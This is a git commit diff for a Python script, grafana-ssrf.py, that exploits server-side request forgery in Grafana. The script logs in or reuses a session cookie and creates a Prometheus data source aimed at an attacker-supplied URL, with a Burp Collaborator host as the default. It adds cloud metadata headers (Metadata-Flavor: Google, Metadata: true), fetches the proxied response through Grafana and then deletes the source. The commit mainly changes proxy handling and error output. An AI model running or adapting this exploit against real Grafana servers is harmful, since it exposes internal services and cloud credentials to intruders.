8b48568586fddee2362fab6b21085e9155f1de44
Robert Wiggins <51722811+RandomRobbieBF@users.noreply.github.com>
2021-05-14 13:10:27 +0100

    Update grafana-ssrf.py

--- grafana-ssrf.py
+++ grafana-ssrf.py
@@ -23,11 +23,11 @@ session = requests.Session()
 parser = argparse.ArgumentParser()
 parser.add_argument("-s", "--session", required=False ,default="9765ac114207245baf67dfd2a5e29f3a",help="Session Cookie Value")
 parser.add_argument("-u", "--url", required=False, default="http://8t2s8yx5gh5nw0z9bd3atkoprgx6lv.burpcollaborator.net",help="URL of host to check will need http or https")
-parser.add_argument("-H", "--host", default="http://kubernetes.docker.internal:5000",required=False, help="Host for Grafana")
+parser.add_argument("-H", "--host", default="http://kubernetes.docker.internal:5000",required=True, help="Host for Grafana")
 parser.add_argument("-f", "--file", default="urls.txt",required=False, help="File of URLS to check SSRF Against")
-parser.add_argument("-U", "--username", default="admin",required=False, help="Username for Grafana")
-parser.add_argument("-P", "--password", default="admin",required=False, help="Password for Grafana")
-parser.add_argument("-p", "--proxy",required=False, help="Proxy for debugging")
+parser.add_argument("-U", "--username", default="",required=False, help="Username for Grafana")
+parser.add_argument("-P", "--password", default="",required=False, help="Password for Grafana")
+parser.add_argument("-p", "--proxy", default="http://127.0.0.1:8085",required=False, help="Proxy for debugging")
 
 args = parser.parse_args()
 ssrf_url = args.url
@@ -36,15 +36,13 @@ ghost = args.host
 files = args.file
 username = args.username
 password = args.password
-proxy = args.proxy
 
 
-http_proxy = proxy
-proxyDict = { 
-              "http"  : http_proxy, 
-              "https" : http_proxy, 
-              "ftp"   : http_proxy
-            }
+
+if args.proxy:
+	http_proxy = args.proxy
+	os.environ['HTTP_PROXY'] = http_proxy
+	os.environ['HTTPS_PROXY'] = http_proxy
             
         
 def create_source(sessionid,ssrf_url,ghost):
@@ -53,48 +51,53 @@ def create_source(sessionid,ssrf_url,ghost):
 	rawBody = "{\"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"access\":\"proxy\",\"isDefault\":false}"
 	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/new","Connection":"close","x-grafana-org-id":"1","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
 	cookies = {"grafana_session":""+sessionid+""}
-	response = session.post(""+ghost+"/api/datasources", data=rawBody, headers=headers, cookies=cookies,verify=False, proxies=proxyDict)
+	response = session.post(""+ghost+"/api/datasources", data=rawBody, headers=headers, cookies=cookies,verify=False)
 	y = json.loads(response.text)
 	if "Data source with same name already exists" in response.text:
 		print("You will need to manually delete the current source that is named SSRF-TESTING")
 		sys.exit(0)
 	elif "id" in response.text:
+		print("Source Created")
 		return (y["id"])
 	else:
 		print ("Error:")
+		print("Status code:   %i" % response.status_code)
 		print(response.text)
-		sys.exit(0)
+		
 
 
 
 def refresh_source(ghost,sessionid,id):
 	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/6/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
 	cookies = {"grafana_session":""+sessionid+""}
-	response = session.get(""+ghost+"/api/datasources/"+id+"", headers=headers, cookies=cookies,verify=False, proxies=proxyDict)
+	response = session.get(""+ghost+"/api/datasources/"+id+"", headers=headers, cookies=cookies,verify=False)
 	if response.status_code == 200:
 		print("Refreshed Sources")
 	else:
 		print("Error:")
+		print("Status code:   %i" % response.status_code)
 		print(response.text)
-		sys.exit(0)
+		delete_source(sessionid,id,ghost)
+		
 
 def create_ssrf(sessionid,ssrf_url,ghost,id):
 	rawBody = "{\"id\":"+id+",\"orgId\":1,\"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"typeLogoUrl\":\"\",\"access\":\"proxy\",\"url\":\""+ssrf_url+"\",\"password\":\"\",\"user\":\"\",\"database\":\"\",\"basicAuth\":false,\"basicAuthUser\":\"\",\"basicAuthPassword\":\"\",\"withCredentials\":false,\"isDefault\":false,\"jsonData\":{\"tlsSkipVerify\":true,\"httpHeaderName1\":\"Metadata-Flavor\",\"httpHeaderName2\":\"Metadata\",\"httpMethod\":\"GET\"},\"secureJsonFields\":{},\"version\":1,\"readOnly\":false,\"secureJsonData\":{\"httpHeaderValue1\":\"Google\",\"httpHeaderValue2\":\"true\"}}"
 	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/6/","Connection":"close","x-grafana-org-id":"1","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
 	cookies = {"grafana_session":""+sessionid+""}
-	response = session.put(""+ghost+"/api/datasources/"+id+"", data=rawBody, headers=headers, cookies=cookies,verify=False, proxies=proxyDict)
+	response = session.put(""+ghost+"/api/datasources/"+id+"", data=rawBody, headers=headers, cookies=cookies,verify=False)
 	if response.status_code == 200:
 		print("SSRF Source Updated")
 	else:
 		print("Error:")
+		print("Status code:   %i" % response.status_code)
 		print(response.text)
-		sys.exit(0)		
+				
 	
 
 def check_ssrf(sessionid,id,ghost,ssrf_url):
 	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/"+id+"/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","x-grafana-nocache":"true"}
 	cookies = {"grafana_session":""+sessionid+""}
-	response = session.get(""+ghost+"/api/datasources/proxy/"+id+"/", headers=headers, cookies=cookies,verify=False, proxies=proxyDict)
+	response = session.get(""+ghost+"/api/datasources/proxy/"+id+"/", headers=headers, cookies=cookies,verify=False)
 	if response.status_code != 502:
 		print("Status code:   %i" % response.status_code)
 		print("Response body:\n %s" % response.text)
@@ -109,6 +112,7 @@ def check_ssrf(sessionid,id,ghost,ssrf_url):
 	else:
 		print("Error:")
 		print(response.text)
+		delete_source(sessionid,id,ghost)
 
 
 
@@ -117,7 +121,7 @@ def delete_source(sessionid,id,ghost):
 
 	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/3/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
 	cookies = {"grafana_session":""+sessionid+""}
-	response = session.delete(""+ghost+"/api/datasources/"+id+"", headers=headers, cookies=cookies,verify=False, proxies=proxyDict)
+	response = session.delete(""+ghost+"/api/datasources/"+id+"", headers=headers, cookies=cookies,verify=False)
 	if "Data source deleted" in response.text:
 		print("Deleted Old SSRF Source")
 	else:
@@ -131,7 +135,7 @@ def login(ghost,username,password):
 	rawBody = "{\"user\":\""+username+"\",\"password\":\""+password+"\",\"email\":\"\"}"
 	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/signup","Connection":"close","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
 	cookies = {"redirect_to":"%2F"}
-	response = session.post(""+ghost+"/login", data=rawBody, headers=headers, cookies=cookies,verify=False, proxies=proxyDict)
+	response = session.post(""+ghost+"/login", data=rawBody, headers=headers, cookies=cookies,verify=False)
 	if "grafana_session" in response.cookies:
 		return response.cookies["grafana_session"]
 	if "grafana_sess" in response.cookies:
@@ -142,8 +146,8 @@ def login(ghost,username,password):
 
 
 
-if username:
-	sessionid = login(ghost,username,password)
+#if username:
+#	sessionid = login(ghost,username,password)
 	
 
 
@@ -166,6 +170,3 @@ if files:
 				create_ssrf(sessionid,ssrf_url,ghost,id)
 				check_ssrf(sessionid,id,ghost,ssrf_url)
 			f.close()
-
-
-
